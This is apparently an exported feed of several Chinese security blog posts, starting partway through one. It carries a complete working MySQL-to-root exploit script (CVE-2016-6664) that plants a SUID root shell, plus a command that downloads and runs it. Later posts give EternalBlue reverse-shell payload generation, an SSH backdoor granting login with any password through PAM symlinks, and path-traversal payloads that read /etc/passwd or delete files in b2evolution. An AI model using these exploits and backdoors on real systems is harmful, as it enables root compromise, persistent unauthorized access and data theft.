mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient./mysql-privesc-race test 123456 localhost testdb 如图可以看到已提升为mysql权限 0x03Mysql权限提升为root权限利用CVE-2016-6664ps:目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式不过tutum/lamp日志方式为syslog，需要如下修改123vim /etc/mysql/conf.d/mysqld_safe_syslog.cnf删除syslog重启mysql：mysqld_safe --user=mysql 测试办法grep -r syslog /etc/mysql返回没有任何结果既满足“基于文件的日志”要求上传mysql-chowned.sh，内容如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#!/bin/bash -p# Usage:# ./mysql-chowned.sh path_to_error.log BACKDOORSH="/bin/bash"BACKDOORPATH="/tmp/mysqlrootsh"PRIVESCLIB="/tmp/privesclib.so"PRIVESCSRC="/tmp/privesclib.c"SUIDBIN="/usr/bin/sudo"function cleanexit &#123; # Cleanup echo -e "\n[+] Cleaning up..." rm -f $PRIVESCSRC rm -f $PRIVESCLIB rm -f $ERRORLOG touch $ERRORLOG if [ -f /etc/ld.so.preload ]; then echo -n &gt; /etc/ld.so.preload fi echo -e "\n[+] Job done. Exiting with code $1 \n" exit $1&#125;function ctrl_c() &#123; echo -e "\n[+] Ctrl+C pressed" cleanexit 0&#125;#intro echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"# Argsif [ $# -lt 1 ]; then echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n" echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '&#123; print $2 &#125;' | cut -d' ' -f1 | grep '/'`\n" exit 3fi# Priv checkecho -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"id | grep -q mysql if [ $? -ne 0 ]; then echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n" exit 3fi# Set target pathsERRORLOG="$1"if [ ! -f $ERRORLOG ]; then echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n" exit 3fiecho -e "\n[+] Target MySQL log file set to $ERRORLOG"# [ Active exploitation ]trap ctrl_c INT# Compile privesc preload libraryecho -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt;uid_t geteuid(void) &#123; static uid_t (*old_geteuid)(); old_geteuid = dlsym(RTLD_NEXT, "geteuid"); if ( old_geteuid() == 0 ) &#123; chown("$BACKDOORPATH", 0, 0); chmod("$BACKDOORPATH", 04777); //unlink("/etc/ld.so.preload"); &#125; return old_geteuid();&#125;_solibeof_/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"if [ $? -ne 0 ]; then echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC." cleanexit 2;fi# Prepare backdoor shellcp $BACKDOORSH $BACKDOORPATHecho -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"# Safety checkif [ -f /etc/ld.so.preload ]; then echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety." exit 2fi# Symlink the log file to /etcrm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOGif [ $? -ne 0 ]; then echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink." cleanexit 3fiecho -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"# Wait for MySQL to re-open the logsecho -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "read THE_ANSWERif [ "$THE_ANSWER" = "y" ]; then echo -e "Got it. Executing 'killall mysqld' now..." killall mysqldfiwhile :; do sleep 0.1 if [ -f /etc/ld.so.preload ]; then echo $PRIVESCLIB &gt; /etc/ld.so.preload rm -f $ERRORLOG break; fidone# Inject the privesc.so shared library to escalate privilegesecho $PRIVESCLIB &gt; /etc/ld.so.preloadecho -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"chmod 755 /etc/ld.so.preload# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"sudo 2&gt;/dev/null &gt;/dev/null#while :; do # sleep 0.1# ps aux | grep mysqld | grep -q 'log-error'# if [ $? -eq 0 ]; then# break;# fi#done# Check for the rootshellls -l $BACKDOORPATHls -l $BACKDOORPATH | grep rws | grep -q rootif [ $? -eq 0 ]; then echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`" echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"else echo -e "\n[!] Failed to get root" cleanexit 2fi# Execute the rootshellecho -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"$BACKDOORPATH -p -i# Job done.cleanexit 0 必须以mysql权限执行才能成功提为root，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令123wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.shchmod 777 mysql-chowned.sh./mysql-chowned.sh /var/log/mysql/error.log 如图可以看到已获得root权限 0x04回顾www-data权限提升为mysql的条件1.已经getshell，获得www-data权限2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权 mysql提升为root权限的条件1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）2.需要在mysql权限下运行才能利用（可通过上面的方式先获取mysql权限） 参考链接：1.http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html2.http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html3.http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html4.http://bobao.360.cn/learning/detail/3027.html]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Mysql</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Eternalblue（MS17-010）纯Python3利用脚本]]></title>
    <url>%2F2017%2F05%2F12%2FEternalblue_ms17-010%2F</url>
    <content type="text"><![CDATA[0x00 前言前段时间Equation Group泄露Eternalblue(MS17-010)的利用工具，搭建环境比较麻烦，借助exploit-db上的exp优化修改了一个纯python3的利用脚本。 0x01 使用简介1.直接运行python3 ./ms17-010.py，提示使用方法及以x64为例的shellcode生成命令（亲测直接用Dll文件会蓝屏）1234567Usage: python3 ./ms17-010.py --host xxx --file xxx --port xxx[!] You can make a nc reverse shell USER_SHELLCODE_FILE in kali2.0 by use : "msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode"[!] You can make a meterpreter reverse shell USER_SHELLCODE_FILE in kali2.0 by use : "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode" 2.直接运行python3 ./ms17-010.py -h提示参数的含义（除非getshell以后的特殊提权利用以外，通常不需要修改端口号）123456789usage: ms17-010.py [-h] [--host HOST] [--port PORT] [--file FILE]Process some integers.optional arguments: -h, --help show this help message and exit --host HOST, -H HOST Host ip --port PORT, -p PORT Target port,defalut:445 --file FILE, -f FILE User shellcode file 3.利用反弹shellcode需要在反弹主机上监听对应端口3.1 nc:1nc -lvp 8888 3.2 meterpreter:12345msfconsoleuse exploit/multi/handler set windows/x64/meterpreter/reverse_tcpset lhost x.x.x.xset lport xxx 0x02 源码http://blackwolfsec.cc/static/code/ms17-010.py 提示:本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Python</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux软连接ssh后门之我见]]></title>
    <url>%2F2017%2F03%2F24%2FLinux_ssh_backdoor%2F</url>
    <content type="text"><![CDATA[0x00 前言学习了Sevck发表Linux软连接后门的《一条命令引发的思考》，还是存在几个疑惑点，仔细探究之后就有了这篇文章 0x01简单回顾一、Linux经典软连接后门命令1.在被控制端执行：ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345建立sshd的软连接2.本地客户端执行：ssh root@x.x.x.x -p 12345接着输入任意密码就可以root用户权限登陆了实际测试中发现，如果root用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：ssh ubuntu@x.x.x.x -p 12345接着输入任意密码就可以ubuntu用户权限登陆了二、后门原理 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0（root）即可成功认证登陆 0x02疑惑与探究1.不建立链接直接启动/usr/sbin/sshd是否也能任意密码登陆针对这个疑惑很容易验证，被控端执行命令1/usr/sbin/sshd -oport=12345 客户端ssh root:任意密码@x.x.x.x 12345登录失败实践结果表明不能通过直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门2.sshd是否允许PAM认证对后门是否有影响修改/etc/ssh/sshd_config修改设置UsePAM no 1ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345 客户端ssh root:任意密码@x.x.x.x 12345登录失败 实践结果表明禁止sshd使用PAM认证后，ssh登陆不调用PAM，严格验证用户密码，所以不能建立任意密码登录后门。3.软连接的路径及文件名是否有限制首先验证修改路径对后门功能是否有影响，修改软连接路径为/home/su被控端执行1ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345 客户端ssh root:任意密码@x.x.x.x 12345仍然成功登陆 实践表明软连接的路径对后门的功能没有影响其次修改软连接文件名对后门功能是否有影响，修改软连接为/tmp/pam_test被控端执行1ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345 客户端ssh root:任意密码@x.x.x.x 12345认证失败实践表明软连接的文件名会影响后门功能，而且在ssh开启pam认证的前提下，默认调用的pam配置文件按是软连接的文件名（pam_test）4.此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件在被控端123echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hackercat /etc/pam.d/hackerln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345 客户端ssh root:任意密码@x.x.x.x 12345认证成功 实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含auth sufficient pam_rootok.so即可无密码登陆最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件1find ./ |xargs grep "pam_rootok" 在笔者的测试环境下还有”chsh”、”chfn”包含pam_rootok.so被控端执行：12ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12346ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12347 客户端ssh root:任意密码@x.x.x.x 12346仍然认证成功客户端ssh root:任意密码@x.x.x.x 12347仍然认证成功 0x03小结 Linux软连接ssh后门需要ssh配置允许PAM认证才能使用 如果被控主机不允许root登陆可用其他已存在用户登陆 通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su) 任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[b2evolution目录遍历bypass之CVE-2017-5539]]></title>
    <url>%2F2017%2F02%2F10%2FCVE-2017-5539%2F</url>
    <content type="text"><![CDATA[0x00 前言b2evolution官方针对CVE-2017-5480漏洞修复存在缺陷，可直接bypass删除、读取任意文件（CVE-2017-5539）。 0x01 漏洞回顾b2evolution小于或等于存在6.8.3版本存在目录遍历漏洞导致删除、读取任意文件，漏洞详细分析见笔者上一篇博客，初探CVE漏洞之CVE-2017-5480。官方修复并发布了6.8.4-stable新版本CVE-2017-5480漏洞测试1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=../../../../../../../../../../../../../../test.txt&amp;fm_sources_root=user_4 返回如下图所示，可见官方已修复之前的漏洞 0x02 Bypass修复方式并不安全，补丁地址，补丁部分代码如下12345678910+// Prevent directory traversal using '..'+$re = '/\/?\.\.\/+/'; foreach( $fm_selected as $l_source_path ) &#123;+ if( preg_match( $re, $l_source_path ) )+ &#123;+ debug_die( 'Invalid fm_selected parameter value' );+ &#125; $selected_Filelist-&gt;add_by_subpath( urldecode($l_source_path), true ); &#125; 分析出作者采取过滤../的方式修复CVE-2017-5480漏洞。然而这种方式并不安全,可直接Bypass,参考CVE-2017-5539。修改payload如下： 1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/test.txt&amp;fm_sources_root=user_4 等价的payload如下： 1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\test.txt&amp;fm_sources_root=user_4 通过同作者联系沟通，得到作者如下回复 作者企图通过直接过滤../和..\的方式修复此漏洞。这样就安全了吗？当然不是（最容易想到的方式是使用绝对路径，但是此处有前缀路径拼接不能成功）在/inc/files/files.ctrl.php文件中发现文件路径参数经过了urldecode处理，部分代码如下。1$selected_Filelist-&gt;add_by_subpath( urldecode($l_source_path), true ); 所以即使过滤../和..\也存在如下两种方式绕过，..%252f经过urldecode处理后转换为../,..%255c经过urldecode处理后转换为..\,修改payload如下：1.1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftest.txt&amp;fm_sources_root=user_4 2.1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255ctest.txt&amp;fm_sources_root=user_4 结果如下图 0x03 结束语官方最终采用以下修复，并发布6.8.5-stable版本1$fm_selected = param( 'fm_selected', 'array:filepath', array(), true ); array:filepath参数合规性判断的核心函数如下：123456789101112131415161718192021222324252627282930313233343536function is_safe_filepath( $filepath )&#123; global $filemanager_allow_dotdot_in_filenames; if( ! isset( $filemanager_allow_dotdot_in_filenames ) ) &#123; // This config var is required: debug_die( 'The var &lt;strong&gt;$filemanager_allow_dotdot_in_filenames&lt;/strong&gt; must be defined in config file.' ); &#125; if( empty( $filepath ) ) &#123; // Allow empty file path: return true; &#125; if( ! $filemanager_allow_dotdot_in_filenames &amp;&amp; strpos( $filepath, '..' ) !== false ) &#123; // Don't allow .. in file path because it is disable by config: return false; &#125; do &#123; // Decode file path while it is possible: $orig_filepath = $filepath; $filepath = urldecode( $filepath ); if( strpos( $filepath, '../' ) !== false || strpos( $filepath, '..\\' ) !== false ) &#123; // Don't allow a traversal directory: return false; &#125; &#125; while( $filepath != $orig_filepath ); return true;&#125;?&gt; 如果管理员设置了不允许文件名包含..，只要检测文件路径包含..即返回false 循环进行urldecode操作，然后检测文件路径包含../或..\即返回false]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探CVE漏洞之CVE-2017-5480]]></title>
    <url>%2F2017%2F01%2F18%2FCVE-2017-5480%2F</url>
    <content type="text"><![CDATA[0x00前言CVE-2017-5480，b2evolution小于或等于存在6.8.3版本存在目录遍历漏洞导致删除、读取任意文件。 0x01代码审计1.安装程序下载地址：6.8.3-stable 2.漏洞分析具有后台访问权限的用户管理文件时，发出请求URL(以dave请求自己头像为例)：1http://127.0.0.1/b2evolution/admin.php?ctrl=files&amp;root=user_4&amp;action=file_copy&amp;fm_selected[]=dave.jpg&amp;fm_sources_root=user_4 函数admin.php中部分源码：1require $inc_path.$ctrl_mappings[$ctrl]; 请求文件为：/b2evolution/inc/files/files.ctrl.php文件files.ctrl.php的部分源码1234567if( ($edited_User = &amp; $UserCache-&gt;get_by_ID( $user_ID, false )) === false )&#123; // We could not find the contact to link: $Messages-&gt;add( sprintf( T_('Requested &amp;laquo;%s&amp;raquo; object does not exist any longer.'), T_('User') ), 'error' ); unset( $edited_User ); forget_param( 'user_ID' ); unset( $user_ID );&#125; 可知至少需要具有文件编辑（editer）权限的用户才能成功利用 files.ctrl.php中的任意文件删除漏洞代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061if( $confirmed )&#123; // Delete files, It is possible only file has no links: $selected_Filelist-&gt;load_meta(); while( $l_File = &amp; $selected_Filelist-&gt;get_next() ) &#123; // Check if there are delete restrictions on this file: $restriction_Messages = $l_File-&gt;check_relations( 'delete_restrictions', array(), true ); if( $restriction_Messages-&gt;count() ) &#123; // There are restrictions: $Messages-&gt;add_to_group( $l_File-&gt;get_prefixed_name().': '.T_('cannot be deleted because of the following relations') .$restriction_Messages-&gt;display( NULL, NULL, false, false ), 'warning', T_('Deleting files...') ); // Skip this file continue; &#125; if( $l_File-&gt;unlink() ) &#123; $Messages-&gt;add_to_group( sprintf( ( $l_File-&gt;is_dir() ? T_('The directory &amp;laquo;%s&amp;raquo; has been deleted.') : T_('The file &amp;laquo;%s&amp;raquo; has been deleted.') ), $l_File-&gt;dget('name') ), 'success', T_('Deleting files...') ); $fm_Filelist-&gt;remove( $l_File ); &#125; else &#123; $Messages-&gt;add_to_group( sprintf( ( $l_File-&gt;is_dir() ? T_('Could not delete the directory &amp;laquo;%s&amp;raquo; (not empty?).') : T_('Could not delete the file &amp;laquo;%s&amp;raquo;.') ), $l_File-&gt;dget('name') ), 'error', T_('Deleting files...') ); &#125; &#125; $action = 'list'; $redirect_to = param( 'redirect_to', 'url', NULL ); // Redirect so that a reload doesn't write to the DB twice: header_redirect( empty( $redirect_to ) ? regenerate_url( '', '', '', '&amp;' ) : $redirect_to, 303 ); // Will EXIT // We have EXITed already at this point!!&#125;else&#123; // make sure we have loaded metas for all files in selection! $selected_Filelist-&gt;load_meta(); $index = 0; // Check if there are delete restrictions on the files: while( $l_File = &amp; $selected_Filelist-&gt;get_next() ) &#123; // Check if there are delete restrictions on this file: $restriction_Messages = $l_File-&gt;check_relations( 'delete_restrictions', array(), true ); if( $restriction_Messages-&gt;count() ) &#123; // There are restrictions: $Messages-&gt;add( $l_File-&gt;get_prefixed_name().': '.T_('cannot be deleted because of the following relations') .$restriction_Messages-&gt;display( NULL, NULL, false, false ) ); // remove it from the list of selected files (that will be offered to delete): $selected_Filelist-&gt;remove( $l_File ); unset( $fm_selected[$index] ); &#125; $index++; &#125; if( ! $selected_Filelist-&gt;count() ) &#123; // no files left in list, cancel action $action = 'list'; // Redirect so that a reload doesn't write to the DB twice: header_redirect( regenerate_url( '', '', '', '&amp;' ), 303 ); // Will EXIT // We have EXITed already at this point!! &#125; &#125; break; 任意文件删除漏洞代码利用Payload:1http://127.0.0.1/b2evolution/admin.php?blog=6&amp;ctrl=files&amp;root=collection_6&amp;fm_hide_dirtree=-1&amp;action=delete&amp;fm_selected[]=../../../../../../.././../../../../../../../../../../../../../../../../../../../../../../../../test.txt&amp;crumb_file=FXTab96veYnFmNDbfHfVJ3BxCHq7NNs1 files.ctrl.php中的任意文件读取漏洞代码： 1234567891011121314151617181920212223case 'copy':……$allow_locked_filetypes = $current_User-&gt;check_perm( 'files', 'all' );…… // Copy file $old_path = $loop_src_File-&gt;get_rdfp_rel_path(); $new_path = $selected_Filelist-&gt;get_rds_list_path().$new_names[$loop_src_File-&gt;get_md5_ID()]; if( $old_path == $new_path &amp;&amp; $loop_src_File-&gt;_FileRoot-&gt;ID == $selected_Filelist-&gt;_FileRoot-&gt;ID ) &#123; // File path has not changed... $Messages-&gt;add_to_group( sprintf( T_('«%s» has not been copied'), $old_path ), 'note', T_('Copying files:') ); continue; &#125; // Get a pointer on dest file $dest_File = &amp; $FileCache-&gt;get_by_root_and_path( $selected_Filelist-&gt;get_root_type(), $selected_Filelist-&gt;get_root_ID(), $new_path ); // Perform copy: if( ! $loop_src_File-&gt;copy_to( $dest_File ) ) &#123; // failed $Messages-&gt;add_to_group( sprintf( T_('«%s» could not be copied to «%s»'), $old_path, $new_path ), 'error''Copying files:') ); continue; &#125; $success_message = sprintf( T_('«%s» has been successfully copied to «%s»'), $old_path, $new_path ); $success_title = T_('Copying files:'); break; 任意文件读取漏洞代码利用Payload:1http://127.0.0.1/b2evolution/admin.php?blog=6&amp;ctrl=files&amp;root=collection_6&amp;fm_hide_dirtree=-1&amp;action=file_copy&amp;fm_selected[]=../../../../../../../../../../../../../../../../../../etc/passwd&amp;fm_sources_root=collection_6 files.ctrl.php中重命名时文件扩展名限制代码：123456if( $check_error = check_rename( $new_names[$loop_src_File-&gt;get_md5_ID()], $loop_src_File-&gt;is_dir(), $loop_src_File-&gt;get_dir()allow_locked_filetypes ) )&#123; $confirmed = 0; param_error( 'new_names['.$loop_src_File-&gt;get_md5_ID().']', $check_error ); continue;&#125; 从源码由于文件扩展名限制，修改copy的文件名为*.txt才能copy成功任意文件，从而读取内容。 Tips: 文件编辑（editer）权限的用户才能成功利用 读文件时注意重命名文件为*.txt 0x02后记黑盒测试+代码审计，最终成功提交第一个CVE漏洞，来张图记录一下过程]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Termux打造Android手机渗透神器（2017-7-22更新）]]></title>
    <url>%2F2016%2F12%2F10%2Ftermux%2F</url>
    <content type="text"><![CDATA[0x00前言Termux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持python,ruby,go,nodejs。本文使用termux搭建Nmap、Sqlmap、BBScan、subDomainsBrute、Hydra、RouterSploit等实现支持端口扫描、注入检测、子域名爆破、多协议弱口令爆破、路由器漏洞检测框架多种功能的Android手机渗透神器。 0x01Termux安装及使用Termux是一款开源的安卓终端Linux环境模拟器应用。开源github地址，应用官网，是Android手机上学习Linux使用以及Python等语言编程的绝佳利器1.安装官方推荐使用Google Player和F-Droid两个应用商店下载，笔者选择F-Droid提供的下载地址，下载后直接安装（首次打开应用会执行更新操作，需要保持手机网络畅通。）2.使用技巧（参考官方帮助文档）（1）基本使用 Termux界面长按屏幕，显示菜单项（包括返回、复制、粘贴、更多），此时屏幕出现可选择的复制光标。 Termux界面从左向右滑动，显示隐藏式导航栏，可以新建、切换、重命名会话session和调用弹出输入法 （2） 常用快捷键音量-键模拟（Ctrl）键123456789音量-键(Ctrl)+L 清除屏幕内容音量-键(Ctrl)+C 终止当前操作音量-键(Ctrl)D 退出当前会话session音量+键+D Tab键（可自动补全命令或文件名）音量+键+W 方向键 上（可显示前一条命令）音量+键+S 方向键 下（可显示后一条命令）音量+键+A 方向键 左（可左移动光标）音量+键+D 方向键 右（可右移动光标）音量+键+Q 显示或关闭扩展键（ESC、插入链接CTR、ALT、TAB、-、/、|以及左滑扩展键一栏可切换到全功能支持手机输入法的输入框） 更多快捷按键参考官网介绍，有蓝牙键盘的读者可以参考硬件快捷键使用（3）常用命令123456789apt update 更新源apt search &lt;query&gt; 全文搜索可安装包apt install &lt;package&gt; 安装软件包apt upgrade 升级软件包apt show &lt;package&gt; 显示软件包的信息apt list [--installed] 列出所有（或已安装）的软件包信息apt remove &lt;package&gt; 删除软件包chmod 修改文件权限chown 修改文件归属 0x02打造Android手机渗透神器（1）显示扩展功能，ESC键，CTR键，TAB键（补全命令和文件名）都是很常用的1音量+键+Q （2）安装基本git、wget、vim、nano、tar、zip、less等(termux下vim支持触摸移动光标移动位置)123456apt install gitapt install wgetapt install vim apt install nanoapt install tarapt install less （3）安装nmap1apt install nmap 安装nmap使用方式使用 （4）安装python2和sqlmaptermux下直接安装python默认是python3.5版本（pip安装python3的扩展包），然而目前很多的软件只支持2.7+（如：sqlmap），于是安装python2,使用pip2安装python2的扩展包，本文中所有python代码均采用python2 filename.py运行12apt install python2git clone https://github.com/sqlmapproject/sqlmap.git （5）安装whatportiswhatportis是一款离线查询端口号对应服务的工具1234#安装pip2 install whatportis#使用whatportis 3306 （6）安装BBScan和subDomainsBrute安装lijiejie的BBScan扫描敏感路径和subDomainsBrute爆破子域名123#安装https://github.com/lijiejie/BBScan.githttps://github.com/y1ng1996/lijiejie_subDomainsBrute.git 提示缺失python扩展包，直接用pip2 install &lt;对应扩展包&gt; （7）安装openssh通过手机ssh链接远程服务器进行管理1234#安装apt install openssh#使用ssh 用户名@主机地址 ######################更新于2017-7-22#############################（8）安装hydra1234#安装apt install hydra#使用hydra -h （9）安装RouterSploit1234567#安装apt install python2git clone https://github.com/reverse-shell/routersploitpip2 install requests#使用cd routersploitpython2 ./rsf.py 0x03结束语 Termux不需root即可在Android终端支持Nmap以及Ruby、Python、Go、Nodejs语言的Linux神器，安装hydra支持常见协议（SSH,FTP,Telnet,HTTP等）的弱口令爆破，使用RouterSploit实现路由器的漏洞检测与利用，同时可以根据实际需求运行相应的程序，从而打造一款属于你自己的Android终端渗透神器。 倘若拥有root权限的读者，推荐termux sudo以便更好地使用root权限]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[温故而知新-DVWA]]></title>
    <url>%2F2016%2F12%2F08%2Fdvwa%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;最近涉猎docker,用docker搭建了DVWA1.9版本，正好把DVWA又重新测试一遍，记录几点安全方面的感悟 0x01感悟1.后台爆破 通常的网站采用验证码的方式防止爆破，然而不少网站验证码过于简单，可以利用验证码识别后继续爆破，还有部分网站验证码可以重复使用，导致验证码形同虚设。 较为安全的后台防止爆破可以采用每次请求附带随机token的方式，可以防止不同的burp爆破,不过不能防止利用脚本获取页面后提交爆破。 geetest验证码通过机器学习判断是否为人为验证，然后返回一个validate，认证需要带上validate，可以防止简单的脚本爆破和burp爆破 最简单最安全的方式是错误次数限制,达到错误阈值后锁定用（ATM机取款仅仅有6位密码也是通过限制错误次数的保障用户的资金安全。） 2.CSRF CSRF主要应用在用户已登录的情况下，通过诱骗用户点击（或者执行加载）恶意链接，向合法的应用服务以用户的身份发送请求，在缺乏防范的时候造成删除文件、添加用户、修改密码等严重后果。 一般情况通过请求携带Token的方式防止CSRF攻击，不过，当网站存在XSS时：利用XSS获取Token，然后发起CSRF请求也可能导致攻击成功。 防止此类漏洞的有效手段是请求页面带Token,并且在敏感操作时要求再次用户确认（比如输入原始密码，提醒是否确定删除。） 3.命令注入 防止命令注入，主要是严格限定输入满足程序的要求，通过正则匹配满足预定输入（比如ip,必须为数字等），或者通过白名单方式限定输入 4.文件上传 文件上传有通过前端限制、黑名单上传类型限制、验证文件后缀、验证文件头，关键函数过滤等多种常见的方式，然而这些方法总存在绕过的漏洞和威胁，切实有效的方法是通过白名单限制上传的文件类型并在服务器端对文件进行重命名操作。 文件包含漏洞+上传可能导致绕过上传限制机制造成攻击 5.SQL注入之MySQL函数CONCAT,CONCAT_WS,GROUP_CONCAT对比(1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串,可以有一个或多个参数。如有任何一个参数为NULL ，则返回值为NULL。 (2)CONCAT_WS(separator,str1,str2,…),返回结果为以separator为分割符的字符串,此函数会忽略参数中的NULL值(如果分割符为NULL,如：select CONCAT_WS(NULL,user_id,last_name,first_name) from users;则返回结果为NULL) 测试CONCAT和CONCAT_WS处理NULL的区别：将Bob的last_name设置为NULL以后update users set last_name=NULL where user_id=5，比较CONCAT和CONCAT_WS的结果,可以看到CONCAT返回为NULL,而CONCAT_WS只是忽略了NULL的字符部分，其他正常显示 (3)GROUP_CONCAT([DISTINCT] expr [,expr …][ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col …]][SEPARATOR str_val])函数返回带有来自一个组的连接的非NULL值的字符串，其中为需要将返回结果去重时使用DISTINCT，需要排序是使用ORDER BY，需要制定分割符是用SEPARATOR(默认是’,’) 将GROUP_CONCAT联合CONCAT_WS或CONCAT使用(NULL的结果已经被过滤)： 0x02总结 白名单比黑名单安全 